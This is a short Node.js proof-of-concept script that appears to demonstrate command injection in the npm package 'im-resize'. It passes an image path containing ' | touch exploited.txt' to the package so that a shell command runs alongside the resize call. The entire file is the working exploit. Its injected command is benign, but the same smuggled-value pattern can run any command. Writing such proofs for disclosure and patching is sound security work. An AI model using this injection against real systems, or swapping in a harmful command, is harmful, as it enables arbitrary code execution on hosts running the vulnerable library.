const pkg = require('im-resize');

const payload = " | touch exploited.txt";

console.log(pkg);

const image = {
    path: payload
};

const output = {
    versions: [5],
    path: process.cwd()
};

const cb = function(error, data) {

};

pkg(image, output, cb);